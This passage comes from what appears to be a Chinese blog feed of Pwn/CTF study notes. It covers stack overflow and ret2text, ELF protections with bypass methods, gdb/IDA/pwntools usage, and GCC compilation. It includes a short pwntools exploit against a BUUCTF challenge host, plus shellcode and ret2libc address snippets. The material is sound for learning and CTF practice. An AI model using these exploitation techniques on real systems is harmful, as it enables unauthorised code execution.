src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxMDMyODA3,size_16,color_FFFFFF,t_70-163789545708327.png"></p><h4 id="0x3-：退出函数时："><a href="#0x3-：退出函数时：" class="headerlink" title="0x3 ：退出函数时："></a>0x3 ：退出函数时：</h4><p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/97df84294fee46548067d91121b51cd3.png" alt="97df84294fee46548067d91121b51cd3"><br>主要就是两个命令leave和ret命令<br><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxMDMyODA3,size_16,color_FFFFFF,t_70-163789546072430.png"></p><p>其最终结果为：</p><p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220210113006332.png" alt="image-20220210113006332"></p><h2 id="三、栈溢出的原理"><a href="#三、栈溢出的原理" class="headerlink" title="三、栈溢出的原理"></a>三、栈溢出的原理</h2><blockquote><p>栈溢出指的是：程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数,因而导致与其相邻的栈中的变量的值被改变。</p><p>栈溢出漏洞轻则可以使程序崩溃,重则可以使攻击者控制程序执行流程。</p></blockquote><p>发生栈溢出的基本前提：</p><ul><li>程序必须向栈上写入数据。</li><li>写入的数据大小没有被良好地控制。</li></ul><h2 id="四、ret2txt的原理"><a href="#四、ret2txt的原理" class="headerlink" title="四、ret2txt的原理"></a>四、ret2txt的原理</h2><p>​ret2text 即控制程序执行程序本身已有的的代码 (.text)。其实，这种攻击方法是一种笼统的描述。我们控制执行程序已有的代码的时候也可以控制程序执行好几段不相邻的程序已有的代码 (也就是 gadgets)，这就是我们所要说的 ROP。</p><p>这时，我们需要知道对应返回的代码的位置。当然程序也可能会开启某些保护，我们需要想办法去绕过这些保护。</p><h2 id="五、实例解析"><a href="#五、实例解析" class="headerlink" title="五、实例解析"></a>五、实例解析</h2><p>以BUUCFT上面的</p><h3 id="1-程序分析"><a href="#1-程序分析" class="headerlink" title="1. 程序分析"></a>1. 程序分析</h3><p>**<font color=red >64位程序，只开启了NX保护</font>**。打开IDA，查看一下源程序<br><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/20210314151057224.png" alt="在这里插入图片描述"></p><h3 id="2-代码分析"><a href="#2-代码分析" class="headerlink" title="2. 代码分析"></a>2. 代码分析</h3><p>就一个write函数和rea函数。可以发现read函数（这里buf只有0x80字节，而read需要从buf中读取0x200个字节），存在溢出条件。然后找是否存在后门函数<br><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxMDMyODA3,size_16,color_FFFFFF,t_70-164243388817221.png" alt="在这里插入图片描述"><br>找到了system，是简单的栈溢出，找到偏移量为0x80+8，然后覆盖返回地址就可以了</p><h3 id="3-exp脚本"><a href="#3-exp脚本" class="headerlink" title="3. exp脚本"></a>3. exp脚本</h3><pre><code># coding: utf-8from pwn import *r = remote(&#39;node3.buuoj.cn&#39;,26896)offset = 0x80 + 8payload = offset*&#39;a&#39; + p64(0x400596)r.sendline(payload)r.interactive()</code></pre>]]></content>
      
      
      <categories>
          
          <category> Pwn入门 </category>
          
          <category> 栈溢出 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Pwn学习笔记-Linux下ELF文件的保护机制</title>
      <link href="/2022/07/12/Pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Linux%E4%B8%8BELF%E6%96%87%E4%BB%B6%E7%9A%84%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/"/>
      <url>/2022/07/12/Pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Linux%E4%B8%8BELF%E6%96%87%E4%BB%B6%E7%9A%84%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/</url>
      
        <content type="html"><![CDATA[<h2 id="一、-canary保护"><a href="#一、-canary保护" class="headerlink" title="一、 canary保护"></a>一、 canary保护</h2><h3 id="1、作用："><a href="#1、作用：" class="headerlink" title="1、作用："></a>1、作用：</h3><blockquote><p>（1）函数开始执行的时候会先往栈里插入一段canary值，当程序真正返回的时候会验证cananry值是否合法，如果不合法就停止程序允许</p><p>（2）这样在覆盖ebp之前时会进行一个验证，验证canary是否准确，如果不准确那么它就会跳转到一个叫_stack_chk_fail的函数当中，就会大致栈溢出覆盖返回地址</p></blockquote><h3 id="2、编译选项："><a href="#2、编译选项：" class="headerlink" title="2、编译选项："></a>2、编译选项：</h3><ul><li><p>关闭：-fno-stack-protector</p></li><li><p>启用（只为局部变量中含有char的函数插入保护代码）：-fstack-protector</p></li><li><p>全启用（为所有函数插入保护代码）：-fstack-protector-all</p></li></ul><p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-202204011211.png" alt="在这里插入图片描述"></p><h3 id="3、实例解析"><a href="#3、实例解析" class="headerlink" title="3、实例解析"></a>3、实例解析</h3><p>下图是开启Canary保护 的一个程序 的反汇编的main函数 的代码，<br><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220720183143132.png" alt="image-20220720183143132"></p><p>首先可以看到把 fs段的0x28 先存放到rax当中 然后保存到[rbp-0x8]里面。rbp-0x8是什么？它不就是的就在rbp上面一个的一个位置吗，如果你的填充了溢出的话是就会导致rbp-8位置的数值发生了改变。</p><p>在出栈的时会进行一个判断：它将之前存放到[rbp-0x8]里面的内容存放到rdx当中，与之前的fs段的0x28进行xor异或判断，如果相等的话就执行je跳转到&lt;main + 94&gt;，如果不相等就会执行call指令，就会跳转到_stack_chk_fail函数当中。</p><p>关于跳转的过程（xor 和 je指令）再在这详细谈一谈<br>xor命令：异或，如果a、b两个值相等则为0，不同则为1<br>je指令：只在 ZF &#x3D; 1的时候才会跳转，跳转到leave指令当中，才能避免执行call指令<br><br><br><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/c2711d95765346dc8b566ee5cbb886cb-16427676363373.png" alt="在这里插入图片描述"><br>ZF又是什么？上面是eflag标准寄存器的低16位的结构，每一个标志位都有其专门的含义。ZF是其中的的一个标志位&#x3D;&#x3D;&gt;0标准位，作用是判断前面那条指令是否为0，若为0则为真即ZF &#x3D; 1，若不为0则为假即ZF &#x3D; 0。</p><p>结合前面的所以内容可以得到的是：<br><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxMDMyODA3,size_16,color_FFFFFF,t_70-16378969517149-164243372951613-16427676363374.png" alt="在这里插入图片描述"></p><p>另外再给出一种确定ZF标志位的值的方法：</p><p>查看执行xor命令以后的标志位寄存器的数值，然后将该数值转换成二进制，ZF标志位在第七位上，然后看该二进制的第七位是0还是1。（在gdb中用 <strong>i r</strong> 命令查看寄存器里面的内容）。同样也可以得到相同的结果。<br>这是正常情况下的执行了xor命令后的eflag寄存器的情况，<br><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/3c0c887a93744728a4d7bbd3174bb992-164243373387414-16427676363375.png" alt="在这里插入图片描述"></p><p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/3ef065f513e14192bc09f78650292dab-164243373680215-16427676363376.png" alt="在这里插入图片描述"><br>可以发现第七位的结果为1，所以ZF &#x3D; 1，可执行je指令</p><p>这是溢出并修改了Canary值以后的标准寄存器：<br><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/97dda4f6881d444a9c8e0ca924b0e6ce-164243374037016-16427676363377.png" alt="在这里插入图片描述"><br><img src="D:/Typroa/note/%25E5%25AE%2589%25E5%2585%25A8/CTF/pwn/1-%25E5%259F%25BA%25E7%25A1%2580%25E5%2587%2586%25E5%25A4%2587/img/e54b89c2af1649688438c452a60549ef-164243374357917-16427676363378.png" alt="在这里插入图片描述"><br>可以发现ZF &#x3D; 0，所以就会导致je不跳转，执行call命令。</p><h4 id="常见的绕过方式："><a href="#常见的绕过方式：" class="headerlink" title="常见的绕过方式："></a>常见的绕过方式：</h4><p>（1）格式化字符串漏洞</p><p>（2）smashing</p><p>（3） 劫持_stack_chk_fail函数</p><h2 id="二、-NX保护-："><a href="#二、-NX保护-：" class="headerlink" title="二、 NX保护 ："></a>二、 <strong>NX保护</strong> ：</h2><h3 id="1、作用：-1"><a href="#1、作用：-1" class="headerlink" title="1、作用："></a>1、作用：</h3><blockquote><p>将数据（栈、堆）所在页面标识为不可执行， 当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令</p></blockquote><h3 id="2、编译选项：-1"><a href="#2、编译选项：-1" class="headerlink" title="2、编译选项："></a>2、编译选项：</h3><ul><li>开启：-z noexecstack </li><li>关闭：-z exestack</li></ul><h3 id="3、-常见的绕过手段"><a href="#3、-常见的绕过手段" class="headerlink" title="3、 常见的绕过手段"></a>3、 常见的绕过手段</h3><p>（1）可以将构造的shellcode写到bss段（具体原因暂未知）</p><p>（2）可以利用ret2libc的方式，通过泄露某个函数的地址获取以此最终获取system函数的地址来getshell</p><h2 id="三、-PIE保护："><a href="#三、-PIE保护：" class="headerlink" title="三、 PIE保护："></a>三、 <strong>PIE保护：</strong></h2><h3 id="1、作用：-2"><a href="#1、作用：-2" class="headerlink" title="1、作用："></a>1、作用：</h3><blockquote><p>是得程序地址空间分布随机化，增加ROP等利用的难度。（因为地址都是不确定的）</p><p>例如：ROP技术需要一些gadget，而这些gadget是需要它实际的地址的。像rdi、rbp等寄存器的地址、像一些函数的地址都无法获得。</p></blockquote><h3 id="2、编译选项"><a href="#2、编译选项" class="headerlink" title="2、编译选项"></a>2、编译选项</h3><ul><li>开启：-pie-fPIC</li><li>关闭：-no-pie</li></ul><h3 id="3、常见的绕过手段"><a href="#3、常见的绕过手段" class="headerlink" title="3、常见的绕过手段"></a>3、常见的绕过手段</h3><h2 id="四、-Fortify保护："><a href="#四、-Fortify保护：" class="headerlink" title="四、 Fortify保护："></a>四、 <strong>Fortify保护</strong>：</h2><h3 id="1、作用"><a href="#1、作用" class="headerlink" title="1、作用"></a>1、作用</h3><blockquote><p>主要用来防止格式化字符串漏洞的利用</p></blockquote><p>（1）包含%n的格式化字符串不能位于程序内存中的可写地址。</p><p><strong>说明</strong>：如果想要使用，必须在程序编写时写好，比如你写在一个全局变量上固定写好，这段位置你不能写</p><p>（2）当使用位置参数时，必须使用范围内的所有参数，如果要使用%7$$x，必须同时使用前面的1$,2$,3$,4$,5$和6$。</p><p><strong>说明：</strong> 存在格式化字符串漏洞，但是限制的输入比较短，而你的格式化字符又比较长</p><h2 id="五、-RELRO保护："><a href="#五、-RELRO保护：" class="headerlink" title="五、 RELRO保护："></a>五、 RELRO保护：</h2><h3 id="（1）作用-："><a href="#（1）作用-：" class="headerlink" title="（1）作用 ："></a>（1）作用 ：</h3><blockquote><p>（1）设置符号重定表位只读并在程序启动时就解析并绑定所有动态符号。 这样就会导致GOT表所在的区域不可写，能减少GOT表的攻击</p><p>（2）常见的解题中会存在将一些函数的got表修改为system函数的地址，这样当执行该函数时就会执行system函数。但是仍然可以作信息泄露</p></blockquote><h3 id="（2）编译选项"><a href="#（2）编译选项" class="headerlink" title="（2）编译选项"></a>（2）编译选项</h3><ul><li><p>开启部分：-z lazy（partial）</p><p>（1）当程序运行之后，执行到了相应的got表以后，它才会解析相应的内容。 利用的就是dl_runtime_resorlve函数</p></li><li><p>开启全部：-z now</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> Pwn入门 </category>
          
          <category> 基础知识 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Pwn学习笔记-分析工具</title>
      <link href="/2022/07/12/Pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7/"/>
      <url>/2022/07/12/Pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7/</url>
      
        <content type="html"><![CDATA[<h1 id="一、GDB的使用"><a href="#一、GDB的使用" class="headerlink" title="一、GDB的使用"></a>一、GDB的使用</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>gdb是Linux的一款动态调试的软件，类似于Windows下的OllyDbg，是后期解题时最重要的一部分。主要是通过调试查找程序本身的逻辑，通过动态调试来分析程序，还可以通过编写脚本来查看程序的输入输出</p><h2 id="1-最常见的指令"><a href="#1-最常见的指令" class="headerlink" title="1. 最常见的指令"></a>1. 最常见的指令</h2><pre><code>s step，si单步步进 n 执行下一条指令 ni步入 b 在某处下断点，可以用 b * adrress（地址） 与 b function_name（函数名字） info b 查看断点信息 delete 删除所有断点 c 继续 r 重新执行distance 0x *  0x*               两地址的距离差ni：单步执行       si：单步进入在exp脚本中加入：gdb.attach(r,&quot;b *0x_____&quot;)  || gdb.attach(r)      动态调试方法</code></pre><h2 id="2-P命令的使用"><a href="#2-P命令的使用" class="headerlink" title="2. P命令的使用"></a>2. P命令的使用</h2><pre><code>p system/main 显示某个函数地址 p $esp 显示寄存器 p/x p/a p/b p/s。。。 p 0xff - 0xea 计算器 print &amp;VarName 查看变量地址 p * 0xffffebac 查看某个地址处的值</code></pre><h2 id="3-X命令的使用"><a href="#3-X命令的使用" class="headerlink" title="3. X命令的使用"></a>3. X命令的使用</h2><pre><code>命令格式：x/&lt;n/f/u&gt; &lt;addr&gt; n是一个正整数，表示需要显示的内存单元的个数 f 表示显示的格式(可取如下值: x 按十六进制格式显示变量。d 按十进制格式显示变量。u 按十进制格式显示无符号整型。o 按八进制格式显示变量。t 按二进制格式显示变量。a 按十六进制格式显示变量。i 指令地址格式c 按字符格式显示变量。f 按浮点数格式显示变量。) u 表示从当前地址往后请求的字节数 默认4byte,u参数可以用下面的字符来代替，b表示单字节，h表示双字节，w表示四字 节，g表示八字节。 &lt;addr&gt;表示一个内存地址 x/xw addr 显示某个地址处开始的16进制内容，如果有符号表会加载符号表 x/x $esp 查看esp寄存器中的值 x/s addr 查看addr处的字符串 x/b addr 查看addr处的字符 x/i addr 查看addr处的反汇编结果</code></pre><h2 id="4-堆中常见命令的使用"><a href="#4-堆中常见命令的使用" class="headerlink" title="4. 堆中常见命令的使用"></a>4. 堆中常见命令的使用</h2><pre><code>heap：查看堆中的chunk情况，之后结合x命令查看每一个chunk的内部情况bins：查看程序运行过程中bin链表的分布情况。</code></pre><h1 id="二、IDA的使用"><a href="#二、IDA的使用" class="headerlink" title="二、IDA的使用"></a>二、IDA的使用</h1><h2 id="1-ctrl-s：调出程序的段表（got-plt表格）"><a href="#1-ctrl-s：调出程序的段表（got-plt表格）" class="headerlink" title="1. ctrl + s：调出程序的段表（got.plt表格）"></a>1. ctrl + s：调出程序的段表（got.plt表格）</h2><h2 id="2-ctrl-x：查看哪个函数调用了它"><a href="#2-ctrl-x：查看哪个函数调用了它" class="headerlink" title="2. ctrl + x：查看哪个函数调用了它"></a>2. ctrl + x：查看哪个函数调用了它</h2><h2 id="3-tab-空格："><a href="#3-tab-空格：" class="headerlink" title="3. tab + 空格："></a>3. tab + 空格：</h2><h2 id="4-简化程序的使用"><a href="#4-简化程序的使用" class="headerlink" title="4. 简化程序的使用"></a>4. 简化程序的使用</h2><p>加一个数组：加上[]就可以快捷键Y：</p><p><img src="/img/image-20210927173915662-164243379159818.png" alt="image-20210927173915662"></p><p><img src="/img/image-20210927173931150-164243380074719.png" alt="image-20210927173931150"></p><p>结构体，在结构体页面添加（insert键），按键d可以改变数据类型。</p><p><img src="/img/image-20210927175259867.png" alt="image-20210927175259867"></p><p>这个数据类型其实是这个结构体最后面的一个数据类型，我们想要这个结构体申请更多的空间：右键 + expend</p><p><img src="/img/image-20210927175605078.png" alt="image-20210927175605078"></p><p><img src="/img/image-20210927175703618.png" alt="image-20210927175703618"></p><p>按d定义一个数据类型（提示是告诉我们名字已经被使用了），字节大小的转换d</p><p><img src="/img/image-20210927183851581.png" alt="image-20210927183851581"></p><p>再按y更改结构体类型，将void改成我们自己定义的结构体</p><h1 id="三、pwntools库的使用"><a href="#三、pwntools库的使用" class="headerlink" title="三、pwntools库的使用"></a>三、pwntools库的使用</h1><p>可参考：<a href="https://blog.csdn.net/A951860555/article/details/110990925">https://blog.csdn.net/A951860555/article/details/110990925</a></p><h2 id="1-导入pwntools库"><a href="#1-导入pwntools库" class="headerlink" title="1. 导入pwntools库"></a>1. 导入pwntools库</h2><pre><code class="python">from pwn import *  # 导入pwntools库</code></pre><h2 id="2-建立连接"><a href="#2-建立连接" class="headerlink" title="2. 建立连接"></a>2. 建立连接</h2><pre><code class="python">r = process(&quot;./pwn&quot;) # 本地连接：括号内为连接的文件名。用本地连接的话方便调试r = remote(&quot;node4.buuoj.cn&quot;, 27244)# 远程连接“ip(或者域名)”, 端口号</code></pre><h2 id="3-设置目标机信息"><a href="#3-设置目标机信息" class="headerlink" title="3. 设置目标机信息"></a>3. 设置目标机信息</h2><pre><code class="python">context(os=&#39;linux&#39;, arch=&#39;amd64&#39;, log_level=&#39;debug&#39;) #设置目标机的信息&#39;&#39;&#39;os：系统为linux系统，一般pwn中的题目的系统是linuxarch: 设置架构为amd64位；如果是32位的话就是ii1386log_level： 设置日志输出的等级为debug，这样pwntools会将所有的输入输出打印出来，方便进行调试，查看数据&#39;&#39;&#39;</code></pre><h2 id="4-发送payload"><a href="#4-发送payload" class="headerlink" title="4. 发送payload"></a>4. 发送payload</h2><pre><code class="python">r.send(payload)  #将paylaod这段字节流数据发送到远程服务r.sendline(payload)#将paylaod这段字节流数据发送到远程服务,并且多发送一个回车。r.sendafter(&quot;some_string&quot;, payload) # 在接收到 some_string 后, 发送你的 payload;r.sendlineafter(&quot;some_string&quot;, payload) #在接收到 some_string 后, 发送你的 payload，并换行</code></pre><h2 id="5-接收返回内容"><a href="#5-接收返回内容" class="headerlink" title="5. 接收返回内容"></a>5. 接收返回内容</h2><pre><code class="python">r.recv()r.recvuntil()r.intereactive()# 进行远程交互</code></pre><h2 id="6-数据打包"><a href="#6-数据打包" class="headerlink" title="6. 数据打包"></a>6. 数据打包</h2><p>数据打包,即将整数值转换为32位或者64位地址一样的表示方式。</p><p>比如0x400010表示为\x10\x00\x40一样,这使得我们构造payload变得很方便</p><ul><li><p>p32&#x2F;p64: 打包一个整数,分别打包为32或64位</p></li><li><p>u32&#x2F;u64: 解包一个字符串,得到整数</p></li></ul><p>p对应的是pack，打包； u对应的是unpack，解包</p><pre><code class="python">payload = p32(0xdeadbeef) `# 打包成\xef\xbe\xad\xde 采取的是小端存储的方式payload = u32(&quot;123456&quot;)</code></pre><h2 id="7-数据输出"><a href="#7-数据输出" class="headerlink" title="7. 数据输出"></a>7. 数据输出</h2><pre><code class="python">log.info(str)# 将str的内容输出出来# 当然用python的print也是可以的</code></pre><h2 id="8-汇编与shellcode"><a href="#8-汇编与shellcode" class="headerlink" title="8. 汇编与shellcode"></a>8. 汇编与shellcode</h2><p>有的时候我们需要在写exp的时候用到简单的shellcode，pwntools提供了对简单的shellcode的支持。<br>首先，常用的，也是最简单的shellcode，即调用&#x2F;bin&#x2F;sh可以通过shellcraft得到：</p><p>注意，由于各个平台，特别是32位和64位的shellcode不一样，所以最好先设置context。</p><pre><code class="python">code = asm(shellcraft.sh())# asm()函数接收一个字符串作为参数，得到汇编码的机器代码。shellcraft模块是shellcode的模块，包含一些生成shellcode的函数。print(shellcraft.sh()) # 打印出shellcodeprint(asm(shellcraft.sh())) # 打印出汇编后的shellcode</code></pre><h2 id="9-ELF文件操作"><a href="#9-ELF文件操作" class="headerlink" title="9. ELF文件操作"></a>9. ELF文件操作</h2><pre><code class="python">e = ELF(&quot;./pwn&quot;)#先获取到这个ELF文件的内容，这个是调用时必须要有的write_plt_addr = e.plt[&quot;write&quot;]# 在文件中获取到write函数的plt表的地址write_got_addr = e.got[&quot;write&quot;]# 在文件中获取到write函数的got表的地址main_addr = e.symbols[&quot;main&quot;]# 在文件中获取到main函数真实的地址</code></pre><h2 id="10-关于libc的一些操作"><a href="#10-关于libc的一些操作" class="headerlink" title="10. 关于libc的一些操作"></a>10. 关于libc的一些操作</h2><pre><code class="python">libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)#获取这个libc文件库的内容，一般来说题目会给出这个libc的版本base_addr = write_addr - libc.symbols[&quot;write&quot;]#获取这个libc文件中write函数的的地址system_addr = base_addr + libc.symbols[&quot;system&quot;]#获取这个libc文件中system函数的的地址binsh_addr = base_addr + libc.search(&quot;/bin/sh&quot;).next()#获取这个libc文件中/bin/sh参数的地址</code></pre>]]></content>
      
      
      <categories>
          
          <category> Pwn入门 </category>
          
          <category> 基础知识 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>二进制基础学习</title>
      <link href="/2022/07/12/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"/>
      <url>/2022/07/12/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>由于研究的主要是ELF文件，所以要对于ELF文件的底层实现要了解，要懂得ELF文件是如何从源代码一步步变成计算机所认识的机械码的。还有要了解ELF文件内部是如何分布的</p><h2 id="一、程序的编译与链接"><a href="#一、程序的编译与链接" class="headerlink" title="一、程序的编译与链接"></a>一、程序的编译与链接</h2><p>一个C语言程序的生命是从源文件开始的，这样高级语言的形式更容易被人理解。但是，要想在操作系统上面运行程序，每条C语句都必须被翻译为一系列的低级机器语言。最后这些指令按照可执行目标文件的格式打包，并以二进制文件的形式存放起来。也就是大家所熟知的exe文件、elf文件。只有弄懂了程序是什么，是如何来的，才能对于分析程序才会更加方便</p><p>下面重点以GCC的编译过程进行了解、学习</p><p>gcc是linux下面的默认的C&#x2F;C++的编译器，它可以将C语言代码直接编译成二进制程序ELF。window下是.exe文件。通过gcc的编译过程可以更加了解生成一个可执行程序的详细步骤。</p><h3 id="1-编译过程"><a href="#1-编译过程" class="headerlink" title="1. 编译过程"></a>1. 编译过程</h3><p>（1）首先编写一个c语言源代码</p><pre><code class="c">#include&lt;stdio.h&gt;int main(int argc, char const *argv[])&#123;    printf(&quot;Hello word!\n&quot;);        return 0;&#125;</code></pre><p>（2）利用gcc编译器，对源代码进行编译</p><pre><code class="bash">gcc test.c -o test -save-temps --verbose</code></pre><p>参数说明：</p><blockquote><p>①<code> gcc test.c</code>： 是对C语言程序进行编译</p><p>②  <code>- o test</code>：是将程序另命令为test文件，默认情况下是会编译成一个（.out）的文件</p><p>③ <code>-save-temps</code>：将编译过程中生成的中间文件保存下来</p><p>④ <code>--verbose</code>：用于查看GCC编译下的详细工作流程</p></blockquote><p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220123112011452.png" alt="image-20220123112011452"></p><p>可以发现：</p><blockquote><p>GCC的编译过程主要包括四个阶段：预处理阶段、 编译过程、汇编过程、链接过程。该过程分辨使用了ccl、as和collect2三个工具</p><p>① ccl是编译器：对应第一二个阶段，用于将源文件test.c &#x3D;&#x3D;》test.s</p><p>② as是汇编器：对应第三个阶段，用于将test.s &#x3D;&#x3D;》test.o</p><p>③ collect2是链接器，是对ld命令的封装：用于将C语言运行时库中的目标文件（前面的test.o文件）以及所需的动态链接库（libgcc.so、libc.so或是自己编写的等等 ）链接到可执行文件hello</p></blockquote><p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20211211134025744-16427467801191.png" alt="image-20211211134025744"></p><p>查看编译过程中的代码的变化：</p><p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20211211133934194.png"></p><h3 id="2-分析整个过程"><a href="#2-分析整个过程" class="headerlink" title="2. 分析整个过程"></a>2. 分析整个过程</h3><h4 id="2-1：-预处理"><a href="#2-1：-预处理" class="headerlink" title="2.1： 预处理"></a>2.1： 预处理</h4><p>主要是处理源代码中关于 “#” 的预处理指令，通常以”.i”作为程序的扩展名</p><blockquote><p>① 删除 # define，展开所有宏定义， 例如 #define x 1000</p><p>② 处理条件预编译指令：#if、#ifedf 、#elif、 #endif</p><p>③ 处理#include 预编译指令，将包含 “.h” 文件直接插在指定的位置</p><p>④ 删除掉所有的注释， &#x2F;**&#x2F;，&#x2F;&#x2F;</p><p>⑤ 添加行号和文件名标识</p></blockquote><p>在命令中添加编译选项 <code>&quot;-E&quot; </code> 可以单独执行预处理</p><pre><code class="bash">gcc -E test.c -o test.i</code></pre><p>此时可以通过编辑器可以查看文件的内容：（符合前面的预处理方式）</p><p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220122192933916.png" alt="image-20220122192933916"></p><h4 id="2-2：编译阶段"><a href="#2-2：编译阶段" class="headerlink" title="2.2：编译阶段"></a>2.2：编译阶段</h4><p>编译阶段就是对预编译的文件进行一系列的分析，最终生成汇编代码。</p><p>在命令中添加编译选项 <code>&quot;-S&quot; </code> 可以单独查看编译阶段，它通常以 <code>.s </code> 结尾</p><pre><code class="bash">gcc -S test.i -o test.s</code></pre><p>通过编辑器软件可以查看到里面的内容是一些汇编语言：</p><p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20211211131534323.png"></p><h4 id="2-3：汇编阶段"><a href="#2-3：汇编阶段" class="headerlink" title="2.3：汇编阶段"></a>2.3：汇编阶段</h4><p>汇编阶段主要就是汇编器根据生成的汇编指令与机械指令的对照表进行翻译，将test.s会变成目标文件test.o。</p><p> 在命令中添加编译选项 <code>&quot;-c&quot; </code> 可以单独生成目标文件</p><pre><code class="bash">gcc -c test.s -o -test.o</code></pre><p>此时的目标文件是一个可重定位文件。并且无法执行此文件</p><p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220122190811226.png"></p><p>通过编辑器打开该文件可以发现里面是一群十六进制组成的</p><p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220122190327401.png" alt="image-20220122190327401"></p><p>此时的话可以通过objdump来查看文件的内容</p><pre><code class="bash">objdump -sd test.o -M intel</code></pre><p>参数说明：</p><blockquote><p>-s：反汇编test.o中的需要执行指令的那些section</p><p>-d：反汇编，查看程序的十六进制和汇编指令</p><p>-M intel：使用intel格式，方便观看</p></blockquote><p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220123121506663.png" alt="image-20220123121506663"></p><p>可以发现关于Hello word 的地址还被设置为00、而且函数printf的地址则指向为下一条指令的地址。这是因为程序还没有链接，无法程序识别printf函数，找不到对应的位置</p><h4 id="2-4：链接过程"><a href="#2-4：链接过程" class="headerlink" title="2.4：链接过程"></a>2.4：链接过程</h4><p>链接过程可使用静态链接或动态链接，这一阶段将目标文件（.o）和所依赖的库进行连接，生成可执行文件（.out）。如果没有链接过程就无法找到一些在库的函数的地址。</p><p>GCC默认使用动态链接，添加静态链接需要设置编译选项为 ”-static“</p><pre><code class="bash">gcc test.o -o test -static</code></pre><p>说明：编译时如果程序不另外命名，则会生成了一个后缀是（.out）的文件。此时运行发现可以出现结果</p><p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220122191356383.png" alt="image-20220122191356383"></p><p>利用objdump查看此时生成的文件的汇编代码：</p><p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220123123347411.png" alt="image-20220123123347411"></p><p>可以发现此时生成的printf函数的地址已经发生了改变，确定了printf函数的地址。通过链接过程，对象文件中无法确定的符号地址已经被修正为实际的符号地址。这样程序也就可以被加载到内存中正常执行了</p><p>动态链接与静态链接的概念</p><blockquote><p>静态链接：是指编译链接时，把库文件的代码全部加入到可执行文件中，那么运行时也就不再需要库文件了。此时你objump分别查看两种情况下的可执行文件，你就会发现静态链接的文件包含了大量的库文件。</p><p>动态链接：是指在链接时仅仅只加入一些描述信息，而是等到程序执行时再从系统中把相应动态库加载到内存</p></blockquote><h2 id="二、ELF-文件格式"><a href="#二、ELF-文件格式" class="headerlink" title="二、ELF 文件格式"></a>二、ELF 文件格式</h2><p>​ELF，即”可执行可链接格式“，最初是作为应用程序二进制接口的一部分而指定发布的，linux系统上面所运行的就是ELF格式的文件。ELF文件又叫做可执行的二进制文件，可执行的二进制文件还有Windows的exe文件。</p><h3 id="1-ELF文件的类型"><a href="#1-ELF文件的类型" class="headerlink" title="1. ELF文件的类型"></a>1. ELF文件的类型</h3><p>ELF文件主要可分为三种类型：可执行文件（&#x2F;exec）、可重定位文件（.rel）和共享目录文件</p><ul><li><p>可执行文件： 经过链接的、可执行的目标文件。通常被成为程序，像前面的a.out文件</p></li><li><p>可重定位文件：由源文件编译而成但是还没有链接的程序，通常以<code>.o </code>作为文件拓展名。 用于与其他目标文件进行链接以构成可执行文件或动态链接库。通常是一段独立的代码。像前面的test.o 文件</p></li><li><p>共享目标文件：动态链接库文件。用来链接过程中与其他动态链接库或者是可重定位文件、或者是在可执行文件在加载时，链接到进程中作为运行代码的一部分。一般是xxx.so</p></li></ul><p><font color=red size=4> 特别说明：</font></p><blockquote><p>在ELF文件格式规范中，ELF文件被统称为目标文件，而不单单是指 